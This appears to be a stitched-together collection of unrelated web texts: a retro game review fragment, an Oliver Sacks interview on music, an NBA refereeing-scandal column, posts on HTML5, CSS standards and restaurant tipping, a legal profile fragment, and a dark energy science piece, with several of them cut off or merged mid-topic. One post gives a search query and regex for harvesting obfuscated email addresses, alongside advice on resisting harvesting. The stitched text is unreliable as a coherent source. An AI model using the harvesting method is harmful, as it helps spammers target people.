Of course , this seems very passé compared to modern games were you can perform a bootleggers turns with very little effort , but at the time it was an art .
Bottom line : it ’s amazing that such a well - crafted racer was born in the 8 - bit era .
Tecmo Bowl
I ’m probably in an extreme minority when compared to the general gaming population , but I thought sports games were more enjoyable when they were in two dimensions .
Somehow when you had 3D camera angles and you were n’t able to see all your players on a single screen , the game got so much more complicated .
Sure , games like Tecmo Bowl wo n’t wow your football buddies with realistic graphics , but the game ’s beauty is in its simplicity .
While today ’s NFL and college football games require military level tactics in order to survive , Tecmo Bowl was all about execution .
Forget the double reverse wide - receiver pass and the 3 - 4 zone blitzes ; Tecmo Bowl had only four plays on either side of the ball to choose from .
This kept the action moving and pressured you to find the open receiver or bust through the hole in the offensive line ( or stop the other team from doing so , as the case may be ) .
Like any sports game , Tecmo Bowl had its flaws due to its simplicity ( high completion rate , for example ) it was just plain fun — and that ’s what is truly important in a video game .
Ninja Gaiden
Ninja Gaiden had so much going for it ( and still does ) .
This action platformer had the feel of the trendy beatemup genre , the platform jumping that could only be rivaled by Metroid , a storyline and cinimatics usually unseen in an 8 - bit game and the frustrating difficulty level of Contra .
It was a hardcore gamer ’s dream come true .
In Ninja Gaiden , you take on the role of Ryu Hayabusa , a ninja set to seek revenge for his missing father .
In the game you will encounter several powerups , which consist of time freeze , recovery medicine , Shuriken , and several ninja arts each of which will help you combat the floods enemies throughout the game .
As opposed to most action titles filled with repetitive action with very little motivation to keep you going , Ninja Gaiden keeps you going with its deep story and amazing cutscenes .
It is a wonderful example of what is possible with the limited resources of an 8 - bit system if given the proper artistic direction .
As many modern gamers now , Ninja Gaiden ’s legacy was continued in its XBox successor , but no one should forget the 8 - bit roots that took the action genre by storm .

This is a longer version of the interview that appears in the October issue of Wired magazine .
A surgeon is struck by lightning and becomes obsessed with Chopin .
An eminent psychoanalyst is kept awake by hallucinations of a singing rabbi .
An amnesiac musicologist incapable of remembering anything that happened more a few seconds ago finds refuge from his disoriented existence by performing Bach fugues .
Music , writes neurologist Oliver Sacks in his new book , Musicophilia : Tales of Music and the Brain , opens a window into almost every aspect of life and brain function .
For his previous case - history collections Awakenings and The Man Who Mistook His Wife for a Hat , Sacks studied the lives of people with disorders like autism and Tourette 's syndrome , turning up startling insights about the brain 's capacity to heal and adapt .
Sacks , 74 , shared his thoughts about music in his Greenwich Village office .
Wired :
When was the first time you felt deeply affected by music ?
Sacks : I grew up in a musical household .
My father played piano , my brothers played the flute and clarinet , and we had string trios and quartets in our house .
When I was five , I would have said that my favorite things in the world were Bach and smoked salmon .
By the time I was a teenager , Mozart would make me want to scream and cry and raptured me .
Wired :
How did you discover that music can aid in healing ?
Sacks :
The therapeutic power of music hit me dramatically in 1966 , when I started working with the Awakenings patients at Beth Abraham in the Bronx .
I saw post - encephalitics who seemed frozen , transfixed , unable to take a step .
But with music to give them a flow , they could sing , dance , and be active again .
For Parkinsonian patients , the ability to perform actions in sequence is impaired .
They need temporal structure and organization , and the rhythm of music can be crucial .
For people with Alzheimer 's , music incites recall , bringing the past back like nothing else .
Let me play something for you .
This is Woody Geist , who I describe in my new book .
He 's had Alzheimer 's for 40 years , and is profoundly disabled in almost every way , but is a member of an a cappella group called the Grunyons .
After I 'd written about him , he sang professionally again , and it was beautiful , though people were afraid he'd be lost before the performance .
Ten seconds afterwards , he had no memory of it .
[ plays " Shooby Doin ' , " from the Grunyons ' CD Just in Time ]
Wired :
That 's beautiful .
Art Tatum , Joaquín Rodrigo , Blind Willie McTell , Stevie Wonder — why are there so many great blind musicians ?
Sacks :
When one is born without a sense or loses it early , one turns to the other senses to construct the richest possible world and identity .
People who are born blind seem to develop extraordinary auditory , tactile , and olfactory sensitivities .
Absolute pitch [ the ability to identify a note without hearing a reference tone ] is pretty rare in the general population — maybe 1 in 10,000 have it .
In professional musicians it 's 1 in 10 .
But in those born blind , musicians or not , it 's nearly 1 in 2 .
A third of all musical savants are blind .
You can be blind without being musical , but there is a correlation .
Wired :
When you were growing up , hearing music often required going to see it performed .
But iPods make music ubiquitous , like mental air - conditioning .
What have we gained or lost by that ?
Sacks :
At first it would seem to be a wonderful gain .
Darwin might have had to go to London to see a concert .
But I can't help wondering if the incidence of earworms and musical hallucinations is higher now , with background music in every public place .
You can't go to a restaurant without music , and they get offended if you ask them to turn it off .
They feel it 's part of their creativity — they 're doing it for you .
The brain is very sensitive to music ; you do n't have to attend to it to record it internally and be affected by it .
I think we may be exposed to too much loud and repetitive music .
One patient of mine has epileptic seizures induced by music and has to wear earplugs in New York City .
It 's a dangerous place for him .
Wired :
You describe Darwin losing his youthful passion for music as his mind became a " machine for grinding general laws out of large collections of fact , " as he put it .
Sacks : I 'm puzzled by this .
As one 's mind becomes preoccupied with theoretical or scientific issues , one may have less attention , time or emotion available for other things .
But there are lots of highest - power intellectuals who stay interested in music , like Einstein .
Darwin may have been as absorbed in thinking about evolution as Freud was absorbed in thinking about psychoanalysis when he went to operas .
All of us are apt to get a little desiccated if we do n't make a point of holding on to the delights of art and music and landscape .
It 's very easy to become preoccupied with theorizing and the activities of daily living and stop noticing the beauties of the world .
Wired :
From the perspective of neurological development , is it important to give music lessons to your kids ?
Sacks :
One can become a creative and good human being without music lessons .
But it does look as if fairly intensive musical training can promote the development of various parts of the brain , which may facilitate other non-musical cognitive powers .
Wired :
In Musicophilia , you describe a camp for children with a genetic disorder called Williams syndrome .
Many of the kids there have impaired intellectual skills , but they 're also extremely chatty and social , and have heightened musical abilities .
Is this correspondence of social and musical abilities just a coincidence ?
Sacks : People with Williams are helplessly empathic — they starve if they do n't get both human and musical contact .
The emotional parts of their brains , like the amygdala , may be unusually large , as well as areas in the temporal lobes concerned with hearing , speech , and music .
For people with Williams , the human , musical , and conversational abilities all seem to go together .
Wired : Harvard cognitive psychologist Steven Pinker argues that music is an evolutionary accident , " auditory cheesecake " that exploits neural resources which originally evolved to process speech .
But your book suggests that certain brain regions are wired specifically to process music .
Sacks :
It 's not a question that we can resolve easily .
One would have to look for aspects of music which have no equivalent in speech .
This certainly seems to be true of the regular beat or pulse .
Speech has its own rhythm , but it does n't have the fixed metrical quality of music .
There 's spontaneous synchronization with rhythm in all human beings , even in childhood .
You tap with it , nod with it , and even if you do n't , the motor parts of your brain move with it .
There 's an auditory / motor correlation in human beings not found in any other animal .
Wired :
You write that there was a time in med school when you took a lot of amphetamines .
What 's the most vivid experience of music you ever had on drugs ?
Sacks :
Hume wondered whether one can imagine a color that one has never encountered .
One day in 1964 , I constructed a sort of pharmacological mountain , and at its peak , I said , " I want to see indigo , now ! "
As if thrown by a paintbrush , a huge , trembling drop of purest indigo appeared on the wall — the color of heaven .
For months after that , I kept looking for that color .
It was like the lost chord .
Then I went to a concert at the Metropolitan Museum of Art .
In the first half , they played the Monteverdi Vespers , and I was transported .
I felt a river of music 400 years long running from Monteverdi 's mind into mine .
Wandering around during the interval , I saw some lapis lazuli snuffboxes that were that same wonderful indigo , and I thought , " Good , the color exists in the external world . "
But in the second half I got restless , and when I saw the snuffboxes again , they were no longer indigo — they were blue , mauve , pink .
I 've never seen that color since .
It took a mountain of amphetamine , mescaline , and cannabis to launch me into that space .
But Monteverdi did it too .
Wired :
You call yourself an old Jewish atheist in your new book .
What is it about music that lends itself to being a catalyst of mystical experience even for people who do n't believe in God ?
Sacks : Music does n't represent any tangible , earthly reality .
It represents things of the heart , feelings which are beyond description , beyond any experience one has had .
The non-representational but indescribably vivid emotional quality is such as to make one think of an immaterial or spiritual world .
I dislike both of those words , because for me , the so - called immaterial and spiritual is always vested in the fleshly — in " the holy and glorious flesh , " as Dante said .
So if music is not directly representative of the world around us , then what 's inspiring it ?
One has the feeling of the muse , and the muses are heavenly beings .
This feeling is very , very strong with Cicoria , the surgeon in my book who was hit by a bolt of lightning .
He felt that he was actually tuning in to the music of heaven — that he had God 's phone number .
I can't avoid that feeling myself when I listen to Mozart .
I feel differently about Beethoven .
I think of Beethoven as a sweating Prometheus , a terrestrial figure .
I intensely dislike any reference to supernaturalism , but I think there can be profound mystical feelings which do not have to call on fictitious agencies like angels and demons and deities .
The whole natural world is bathed in wonder and beauty and mystery .
The feeling of the holy , the sacred , the wonderful , the mystical , can be divorced from anything theological , and is conveyed very powerfully in music .

The worst news for the NBA was not on the cover of Friday 's New York Post , where the words " Fixed ! " and " NBA Ref " and " Mob Betting Scandal " jumped off the page in typical Post apocalyptic font size .
The worst news was in your head .
It was the question you asked .
Not , " Is this possible ? "
More like , " Which ref was it ? "
If any fan base is predisposed to believing games could be fixed , that an official with dubious motives could manipulate the outcome , it 's the NBA's .
There have been too many questionable calls over the years , too many swallowed whistles at critical times , mixed with too few repercussions from the league offices .
So instead of , " I 'm shocked , shocked to find that gambling is going on in here ! " we had , " I knew it . "
And even when we had a name -- Tim Donaghy -- we still did n't have a conviction , an indictment or even a charge .
Just an investigation .
For the NBA , that 's all it takes .
Fair or not , it 's operating with the least benefit of the doubt and the smallest margin for error .
How many times have you heard someone say they 've had it with the NBA because of the officiating ?
You do n't hear college football fans abandoning the sport because of its inane method of determining a champion .
But the league can't get past this notion that its games are not on the up - and - up .
It used to be easy to pose a counter - argument to the conspiracy theorists .
There 's no way the referees could have it in for each of the 30 teams .
If the league did have an agenda , it could not have been to get the ratings - killing San Antonio Spurs to the NBA Finals every other year .
Would David Stern really punish nemesis Mark Cuban for the benefit of the Miami Heat 's Micky Arison , whom he once fined for tampering with Pat Riley while Riley was coaching the Knicks , then smacked with the unprecedented voiding of Juwan Howard 's contract ?
This time it 's too difficult to explain away .
We saw officials implicated in a huge soccer match - fixing case in Italy last year , so we know these things happen .
We have seen NBA officials succumb to the temptation of extra money during the airline tickets scandal , so we know they can be lured by money .
Next time you see a suspect call , is there any barrier to you believing there 's something else to it ?
But while many fans might be turned off , Ken White , the chief operating officer of the Las Vegas Sports Consultants oddsmaking group , does n't think this game - fixing accusation will kill action on NBA games .
" There 's been many point - shaving schemes in sports , professional and college , and it has not affected sports wagering , " White said .
Even with the Dwyane Wade free - throw exhibition that was the 2006s NBA Finals , White said , " Vegas had a record year last year , our biggest year ever , and the NBA was a great year for the sports books . "
People tend to tell different stories with their checkbooks than they do with their mouths .
We moan about the Enrons and MCIs lying about their earnings , but we still put money in the stock market .
We 've been hearing about BALCO for four years now , but we keep buying tickets to baseball games .
We have n't let a string of player arrests stop us from watching NFL games .
( And speaking of the NFL , if I were Roger Goodell my Friday would have consisted of sending a thank - you note to David Stern , then hitting the golf course .
Goodell just got a one - week reprieve from the spotlight ) .
We 'll see how this plays out for the NBA .
White predicts , " Wagering will continue to increase .
There 's no one here in Nevada that bets the NBA on a regular basis that 's going to stop betting . "
One thing that had to take a hit , though : the odds of Las Vegas getting an NBA franchise .
This week 's bad timing award goes to the developers of a proposed Las Vegas arena who were scheduled to meet with NBA officials Friday .
Whoops .
Stern could n't spend all that time worrying about gambling and his league , have this Donaghy story dropped on him , then announce , " We 're going to Vegas , baby ! "
White points out that this game - fixing story is coming out of New York , not Las Vegas .
And the NBA already has cozied up to Vegas more than ever this year , with the All - Star Game , a fully - stocked summer league and the U.S. national team training camp and Tournament of the Americas all producing Las Vegas datelines .
But from here on out , the NBA will have to distance itself from the Strip .
In a league that lives on perception more than any other sport , the integrity of the games just took a major hit .
It 's like " The Sopranos " episode when Tony tried to convince Christopher that there was nothing going on between him and Christopher 's girlfriend Adriana when they were involved in a late - night , lonely - road car wreck .
" I guess I believe you , " Christopher said .
" It does n't matter , though .
It 's what everybody thinks . "

Just something I noticed today .
A lot of people ( I may even be guilty of this ) publish their emails on the web using the following format :
name at gmail dot com
Substitute gmail dot com with your favorite email domain .
The problem with this approach is that it is trivially easy to harvest email addresses in this format with Google .
First , do a search for the following text ( include the quotes ) :
”* at * dot com ”
Now , all you need to do is run a regular expression over the results .
For example , using your favorite regular expression tool , search for this :
( \w+ ) \s+at\s+(\w+ ) \s+dot\s+com
and replace with this :
Now before you blame me for giving the spammers another tool in their arsenal , I would be very surprised if spammers are n’t already doing this .
I highly doubt I ’m the first to think of it .
So what is a better way to communicate your email address without making it succeptible to harvesting ?
You could try mish - mashing your email with HTML entity codes .
For example , when viewed in a browser , the following looks exactly the same as name at gmail dot com .
name at gmail dot com
The key is to somewhat randomly replace characters with entity codes , so that we all do n’t use the exact same sequence .
If we all replaced every letter with its corresponding entity code , it would be trivially easy to farm .
But by introducing some randomness , it becomes a lot more difficult to farm these emails .
It ’s possible , but would take more technical chops and computing power than the technique I just demonstrated .
In criminal cases , he was reversed 20 percent of the time , compared with an overall reversal rate from his court of roughly 15 percent in 2006 .
But in civil cases , his 24 percent reversal rate compared favorably with the overall rate of roughly 30 percent .
Last year , when the Justice Department sought his permission to force a mentally troubled defendant to take psychotropic drugs to render her competent to stand trial , Judge Mukasey expressed a visceral disgust for the idea , even though the Supreme Court had endorsed it .
“ It is not inappropriate to recall in plain terms , ” he wrote , “ what the government seeks to do here , which necessarily involves physically restraining defendant so that she can be injected with mind - altering drugs . ”
“ There was a time when what might be viewed as an even lesser invasion of a defendant ’s person — pumping his stomach to retrieve evidence — was said to ‘ shock the conscience ’ and invite comparison with ‘ the rack and the screw , ’ ” he added , quoting from a 1952 Supreme Court decision .
His writing was consistently cogent , lucid and self - assured , owing something to George Orwell , a hero of his .
Indeed , Judge Mukasey kept a framed photograph of Orwell in his chambers .
“ He is a particular idol of mine for his clear writing and complete disdain for cant , ” Judge Mukasey told a reporter for The Financial Times in 1989 , not long after becoming a judge .
“ I try to recognize when some spongy abstraction is trying to cover up an excuse for thought or analysis . ”
His decisions almost always start with an exceptionally detailed account of the facts , often coupled with a keen awareness of how hard it is to know anything for sure .

A low - bandwidth , high - latency , high - cost , and unreliable data channel I like food , and I 'm not really good at the creative art of cooking ( though I 'm a fine sous - chef ) , so I eat out at restaurants a lot .
I usually pay by credit card .
In the US , waiters have a minimum wage below the normal minimum wage , and thus you always have to tip , and so you never pay what the bill says ( and I usually tip well , unless the service or food was appalling , even outside the US ) .
The net effect of this is that you basically get to decide how much you pay .
Indeed , credit card bills at restaurants have a space where you fill in how much you want to pay .
I do n't like doing arithmetic , especially not of the kind " $ 85.47 * 1.17 " , and so I just approximate .
$ 85.47 is about $ 90 , 15 % of $ 90 is about 15 , round to down to cancel out the earlier approximations gives about $ 100 .
So I pay $ 100.00 and go on my merry way .
One day I looked at my bank statement and it was something like : POS Trans ZIBIBBO PALO ALTO CAUS $ 76.00 POS Trans CHEESECAKE PALO ALTO CAUS $ 40.00 POS Trans OUTBACK #0514 CUPERTINO CAUS $ 210.00 POS Trans BROOKFIELD'S REST # 2 SACRAMENTO CAUS $ 34.00
Look at all those zero cents ... there are data bits there , lying unused !
It struck me that with every single restaurant transaction I could set the cents field to some number under my control , thus allowing me to communicate with myself at a later date !
This would be really useful as a way of sending ratings information back to myself , so that I could later review the restaurants online or otherwise keep track of where I would want to go back to or where I would want to avoid ( since I eat out a lot , restaurants somewhat blend together in my memory ) .
We can set any number from 0 to 99 .
In binary , that 's 0b0000000 to 0b1100011 .
In other words , we have seven bits to play with , except that if both of the high bits are set , then we lose bits 3 , 4 , and 5 .
There are five things I wanted to be able to communicate .
The first was the number of guests , so that I can divide the price by how many people I was paying for , to determine the price - per- person .
The second was the rating , whether I should go back or not .
The last three were whether the restaurant had wifi , whether they were suitable for vegetarians ( Carey is vegetarian ) , and whether they had drinks I liked ( I do n't drink addictive drinks , drinks containing mind - altering drugs , carbonated drinks , and drinks containing high fructose corn syrup , which basically excludes almost anything you can buy in the US in many cheap restaurants , and even some fancy ones ) .
If we consider the rating to be a four - state flag , with values " avoid " , " ok " , " good " , " awesome " , and if we limit ourselves to being able to specify 0 , 1 , 2 , or " more than 2 " guests ( in addition to me ) , and if we establish that if we want to avoid the place in future then it really does n't matter whether the restaurant had Internet , a vegetarian selection , or good drinks , then we can neatly fit this into our contstrained not - quite - 7 - bit bitfield like this :
64 32 16 8 4 2 1 r d v i g ... where : r The rating , according to the following scale : 0 awesome 32 good 64 ok 96 avoid ( and ensure d , v , and i are set to 0 ) d Whether drinks are good or not ( set means they are good ) v
Whether a vegetarian selection is available ( set means there are vegetarian options ) i
Whether free wifi Internet access is available ( set means wifi is available ) g
How many guests were paid for in the transaction : 0 just me 1 me and one guests 2 me and two guests 3 me and three or more guests I did this , and used it for a while .
I quickly discovered that something was wrong .
The numbers in my bank statement made no sense , for example dinners with more than 2 guests at locations where I knew that I had been with just one person .
I changed to a new scheme .
Instead of encoding data in the cents field , I instead just store the last two digits of the dollar amount into the cents field .
A checksum , if you will .
So if it cost around $ 34 with tip , then I put $ 34.34 , or if it cost $ 122 , then I put $ 122.22 .
I do this reliably now , on all restaurant transactions .
What I 've found is a shocking number of restaurants do n't charge me what I write .
For a while I thought I just had bad handwriting , but I then went out of my way to write very clear numbers and that did n't help .
For example , Zibibbo's in Palo Alto .
I remember very clearly writing $ 77.77 , but was charged $ 76.95 .
That 's not the original amount without tip ( which was probably closer to $ 65 ) , it 's not what I wrote , what the heck is it ?
On the other hand , the other time I went , they charged me $ 865.65 , exactly what I wrote .
A cafe in Monterey ( Portola Cafe ) charged me $ 18.28 .
Either they charged me ¢ 10 too much , or they gave me a $ 10 discount .
The Melting Pot , San Jose , charged me $ 70.54 .
Where did the .54 come from ?
Why not take the remaining ¢ 16 ?
Pasta Pomodoro did the same trick as Portola , charging me $ 37.47 .
But two months before that , they charged me $ 34.31 , which is probably ¢3 less than I wrote .
Why am I getting overcharged sometimes and undercharged others ?
In Hawaii , the majority of restaurants ignored the tip altogether , just charging me the original amount regardless of what I wrote .
Are people in Hawaii so relaxed that they do n't need the extra money from tips ?
My theory is that it is because I do n't write an explicit tip , I just give the total .
Maybe restaurants need the tip as well as the total , and so to save time they just work out a round dollar tip that is close to what I wrote , and charge me that .
My next step , to test this theory , is to start always writing the actual tip amount in .

Fire , a two - hour weekend , accessibility , and other rants Somewhere over the rainbow ,
Way up high ,
There 's a land that I heard of
Once in a lullaby .
The explosion during the man 's burn was quite the surprise , but I 'm glad they delayed the derrick 's burn until after the man because otherwise the man would have been a non-event in comparison .
Holy Hannah .
This year was n't quite as enjoyable as last year , but mostly that was just because of the weather : I did n't get to go around the deep playa and jump on art cars as much as I 'd have liked .

The sun is shining ,
It 's a lovely day ,
A perfect morning
For a kid to play , Carey and I have now seen Avenue Q twice , once on Broadway and once in San Francisco .
I love this show .
Everyone should see it .
The internet is really really great .
I ’ve got a fast connection so i do n’t have to wait .
There 's always some new site ;
I browse all day and night ;
It 's like i’m surfing at the speed of light .
Work on HTML5 progresses at a measurable pace — literally , now , since I 'm measuring the number of e-mails I have outstanding on a regular basis to determine how well I 'm hitting my quarterly targets .
( Answer : Not as well as I 'd like , but not as badly as I 'd feared . )
As a side - effect of writing the code to trawl my IMAP folders to count the outstanding e-mails , I wrote a tool that also exposes the folders on the Web ( after having filtered out the confidential feedback I get , of course ) .
I was hoping this would address some of the complaints about lack of transparency , and indeed a number of WHATWG contributors were interested , gave helpful feedback , and even wrote their own frontends using the tool 's APIs .
However , from the W3C corner of the HTML5 communities I only got complaints .
The most notable complaint was that the tool did n't work in IE , which was apparently a problem not because it actually stopped anyone from accessing the page ( I have n't received any complaints from anyone who actually could n't get to the page ) but because it might potentially stop users of old accessibility tools that only work with IE from accessing the page .
When you help others ,
You ca n’t help helping yourself !
Every time you
Do good deeds
You ’re also serving
Your own needs .
I 've actually been using the latest version of JAWS ( the popular Windows screen reader software for blind people ) recently , as part of my work on HTML5 .
From a usability point of view it is possibly the worst software I have ever used .
I 'm still horrified at how bad the accessibility situation is .
All this time I 've been hearing people worried about whether or not Web pages have longdesc attributes specified or whatnot , when in fact the biggest problems facing blind users are so much more fundamental as to make image - related issues seem almost trivial in comparison .
For example , JAWS will happily take the last sentence of a paragraph , and the first sentence of the next paragraph , and run them into each other as one sentence , if there 's no full stop at the end of the first paragraph .
If you really want to make your Web pages more readable to blind users , forget longdesc or even alt , or even markup of any kind , just make sure you 're using full punctuation !
And that 's just one example .
Browsing the Web with JAWS is a horrifying experience not because of the poor state of the Web , which is admittedly very poor indeed from the point of view of semantic and accessible markup , but because of the terrifyingly poor state of the screen reader software .
What might make my experiences with JAWS even more worrying is that I 'm told JAWS is amongst the best of the available screen reader software .
It certainly is n't worth its ridiculous $ 895 price tag ( let alone the $ 1095 price tag for the " professional " version I got ) .
There is a big market opportunity here for someone to make a usable and affordable native speech Web browser or screen reader .
Accessibility advocates could do more for accessibility by writing test suites for screen readers to check their basic HTML support ( like supporting the p element ) than they ever will by trying to educate Web authors .
What do you do with a B.A. in English ?
What is my life going to be ?
Four years of college and plenty of knowledge
Have earned me this useless degree .
Going back to my earlier comment , though , I 'm a little confused as to why several people who have joined the HTML5 community from the W3C HTML WG side are so hostile , while those who joined the community through the WHATWG side are so much more friendly and constructive .
A couple of weeks ago I had to temporarily ban someone from the WHATWG list after they repeatedly cross-posted an off - topic flamewar to four mailing lists including the WHATWG list .
( They did n't get banned from the other three lists as far as I know . )
I was really sad about having to do this , but the health of the community is important , and sometimes extreme measures have to be taken .
This is the first time I 've had to do that to someone on the WHATWG list , and the list has existed since 2004 .
( I 've set up personal mail filters for people on the WHATWG list before , to ensure that I read certain people 's suggestions only once I 've read all the other mail , but I 've never had to actually ban someone . )
The HTML working group is having a meeting in November .
I do n't really see the point , but as I told Dan ( the chair of the working group ) , if we do have a meeting , I 'd like us to use the unconference style , as that 's probably the only useful thing we could do .
Hopefully we 'll have the agenda this week , that way I can know whether I can justify going or not .
I can't really justify spending Google 's money on travel , let alone justify the carbon emissions and the time away from editing the spec , without knowing what exactly the meeting will consist of .
If the meeting just consists of us going through open issues and discussing them , then I wo n't go , since in my experience that 's a huge waste of everyone 's time unless the issue has already failed to be addressed by more asynchronous methods like e-mail .
For technical work like this you really need to be able to sit down and think about issues , and ponder them with a whiteboard ; it is very hard to make sure all the applicable research has been done when there is pressure to discuss and reach a decision on a topic in 60 minutes or less .
This is especially true since for almost all issues , the first time you look at it you 'll find many things you need to research , and it can take days to get all the data you want to make an educated decision .
Using actual data to make decisions about technical issues is n't a very common practice in W3C working groups , which is probably why a lot of the people in the HTML working group who come from a W3C background think a face - to - face meeting is a useful thing to have .
I want you to know
The time that we 've spent
How great it 's been
How much it 's meant .
In July we went to Oslo , Bergen , Geneva , Lourtier , Mamaroneck , Staatsburg , and Hillsdale , to see friends , family , and folk music .
The Falcon Ridge Folk Festival has a sign language interpreter on every stage .
Now mind you , this is a music festival , a specifically sound - orientated event .
Yet it is highly accessible ; all the songs have alternative fallback content for those who cannot hear them .
There are several things about this that I noticed .
First :
The visual version of the song ( lyrics in sign language , and the emotional content of the voice , expressed in the facial expressions and style of the sign language interpreter ) does n't convey the same thing as the original audio version ( the melody , the harmony , the percussion , the lyrics , and the emotion in all of those ) .
It is merely a translation of the parts of the audio stream that are n't intrinsically audio - only .
Alternative content does n't necessarily convey everything in the primary medium , nor does it have to to be useful and enjoyed by the target audience .
Second :
The sign language interpretation is actually quite fun to watch even if you can hear the music , it 's like a kind of interpretative dance .
Alternative content is useful to those who do n't need it as well .
This is n't just my opinion .
It was clear at the festival that the sizeable deaf community present there was fully enjoying the music .
The presence of sign language interpreters made them feel part of the event , and conveyed everything that they wanted conveyed .
Meanwhile , the hearing patrons enjoyed the music and the sign language — I heard comments from several people to the effect that the sign language interpreters were effectively an intrinsic part of the act .
( To the point where even people who did n't necessarily understand sign language had opinions on which interpreter was better . )
It 's interesting how the prevailing opinion of Web accessibility experts is so far removed from the existing and successful accessibility practices in the non -tech world .

Notes for drivers :
The meaning of Red Lights
It came to my attention while I was cycling to Bab5 tonight that not all drivers of big cars may be fully aware of the meaning of this device sometimes found near intersections :
For the purposes of making sure drivers in the area are well educated , I would like to clarify the meaning of this device .
It means " stop " .
That is to say , " do not turn left onto oncoming traffic " .
Thank you for your attention .

The CSS working group is irrelevant Back in March , Google hosted the CSS working group for a three day meeting .
At the time , we were just starting with the HTML working group , and the openness of the WHATWG over the past few years was just starting to be adopted by the HTML working group , after several months of pushing for it in the W3C ( mostly in secret , though my own posts on the matter were all public , as were a few others ) .
One of the things I brought up in the CSS face - to - face meeting was the problem of the CSS working group not being open .
Many of the members of the CSS working group have a mentality that view the Web community ( such as those who e-mail the www - style mailing list ) as a resource , not as potentially equal members of the community .
Of the forty or so members of the working group ( those subscribed to the secret internal mailing list ) , only a dozen subscribe to the public list .
This actually makes it harder for members of the group to try to be more open — when someone posts a proposal to the public list , there 's a good chance that the majority of the members of the working group will miss it .
During the meeting , I opined that if the group continued along in this direction , the group ran the risk of becoming irrelevant ; two of the other members suggested that the group was already irrelevant .
Sadly we were in the minority .
The CSS working group right now is chronically dysfunctional , as most close observers have noticed .
A great example of this is the difference in how the WHATWG got a blog and how the CSS working group set one up .
In the WHATWG , the idea was floated for a while , and then one day someone volunteered to run it , and the blog was up and running within hours .
Anyone ( literally anyone ) can post to the WHATWG blog ( there 's a moderation step that we added to deal with the spammers , but all it takes now is to get onto IRC and ask for the post you wrote to be published ) .
The CSS working group , on the other hand , has been discussing how to set up a blog , and what the first entry should say , and what tool to use , for over two months !
Nearly every phone call ( the group has weekly teleconferences ) for the past nine weeks has had the blog discussed at some point .
The blog was finally made available last week .
To post , you have to be a group member .
The first post can be summarised as follows : the CSS working group members do n't want to bother going out of their way to get feedback on their specs ; instead , people should post their comments on CSS to the public CSS mailing list ( despite the fact that most CSS working group members are n't subscribed to this list ) .
The blog post then goes on to apologise for the blog 's existence , and claims that the blog 's aim is to reach the people who wo n't subscribe to the public mailing list ( the working group itself , maybe ? ) .
The post does n't make it clear how the blog is expected to reach this wider audience , since the blog has no comment feature .
Another example of the problems of the CSS group is visible on the W3C's Technical Reports page .
The group 's primary deliverables are specifications .
The last candidate recommendation published by the group was published in 2004 .
That was the Basic UI module , which was Tantek 's baby ( he has since left the group ) .
Meanwhile , drafts like the Backgrounds and Borders draft , which has had big parts implemented by Safari for months , and small parts implemented by Mozilla for years , have iterated several times but make no public process ( the backgrounds and borders draft was published in 2005 , but the internal draft was last modified in February of this year ) .
Meanwhile , CSS2.1 , the working group 's most important deliverable , keeps getting tied up , with the group discussing irrelevant details and some members repeatedly reopening old resolved issues .
The W3C process does n't help much here either ; the group actually tried taking CSS 2.1 to Candidate Recommendation stage recently , but was blocked by the W3C management over an issue which was already present in CSS2 .
( In all fairness to Tim , the issue he raised is one which was already raised by several other people , but which the group had dismissed .
I actually agree with him that it should be resolved .
The group has since resolved to change the spec in a way that continues to leave the issue undefined , but at least it no longer contradicts what Web browsers do . )
The group is also supposed to work on test suites .
I had volunteered to work on the CSS 2.1 test suite , but due to lack of time , I bailed on that last year ( Google mainly employs me to work on HTML5 ; any test work that I do is done in my free time , which is mostly spent near aquariums now ) .
Since then basically nothing has happened .
Being public would expose a lot of these problems , forcing the working group to act more responsibly .
It would also allow people to contribute — as specification editors , as test suite editors , as reviewers , as community leaders , and in other roles .
But to be honest , the problems go even further than what I 've described above .
The CSS specs show their age ; they come from a time where specifications were much vaguer than those of the modern day .
Someone really needs to do to CSS what the WHATWG has been doing to HTML , defining everything in detail , explicitly , with strict and clear normative conformance criteria , taking implementations into account , defining things like quirks mode .
( The WHATWG community refers to such a hypothetical project as " CSS 5 " , as a reference to the way the current WHATWG specs define HTML5 , XHTML5 , and DOM5 HTML . )
The CSS working group also does n't really have the nimbleness needed to respond to threats to the Web platform like Silverlight .
We need things like flowing - to - shapes , automatic declarative transition animations , gradients , filters , styling of form controls , and so on .
( The WHATWG is already handling some related , non-presentational , things , like client - side SQL databases , video , and rich controls . )
We need these things this year , in enough detail that they can be implemented .
An open group can iterate much faster than a closed group .
With an open group we can get test implementations , feedback , tests , and discussion straight away , instead of waiting months and then pulling back the curtain and presenting a fait accompli , at which points comments are perceived more as a pain than a help .
One way to address this would be for the WHATWG to start a " subproject " to address CSS , while we wait for the W3C CSS group to learn from the W3C HTML group and become open .
The biggest problem would be finding editors who would be willing and capable of doing the incredible work of rewriting CSS from scratch .

Nearly a decade ago , astronomers discovered the surprising existence of dark energy - a mysterious force that pushes galaxies apart and accelerates the expansion of the universe .
Also known as the energy density of the vacuum , dark energy is a property of space itself .
Scientists have many questions about the nature of dark energy .
One question that soon may be answered :
Is the energy density of the vacuum constant over cosmic time ?
Theorists Stuart B. Wyithe ( University of Melbourne ) and Avi Loeb ( Harvard - Smithsonian Center for Astrophysics ) suggest answering that question by studying the distribution of distant hydrogen clumps , which will yield clues to the history of dark energy .
" The simplest expectation is that the energy density of the vacuum was steady over time - a ' cosmological constant '- but we need to check it out .
We might be surprised by the answer , " said Loeb .
Dark energy made its first appearance in Einstein 's General Theory of Relativity .
Einstein believed that the universe was static so he inserted a constant , repulsive force into his equations to counteract the inexorable pull of gravity on all the galaxies .
When Edwin Hubble found that the universe is expanding , Einstein threw out the cosmological constant and is rumored to have called it his " biggest blunder . "
In 1998 , two teams of astronomers discovered that the universe is speeding up , not slowing down under the pull of gravity .
They resurrected Einstein 's cosmological constant in the form of dark energy .
While dark energy clearly exists and its effects are visible to astronomers , no one knows what causes it or whether it is truly constant over time .
" The origin of dark energy is the biggest unsolved problem in astrophysics , " said Wyithe .
Investigating Dark Energy
To study the past behavior of dark energy , astronomers must look into the distant universe , to a region whose light took billions of years to travel to Earth .
At those great distances , individual galaxies and supernovae - the signposts used to study dark energy in our neighborhood - fade to near - invisibility .
A new signpost is needed .
Wyithe and Loeb propose studying the radio emission from neutral hydrogen , whose wavelength is stretched from its starting value of 21 centimeters by the expansion of the universe ( a process called redshifting ) .
After the universe was re-ionized by the first galaxies ( sometime in the first billion years ) , a small fraction of hydrogen remained neutral , surviving in dense pockets .
Astronomers had not realized before this work that 21 - cm signals from the leftover hydrogen might be detectable .
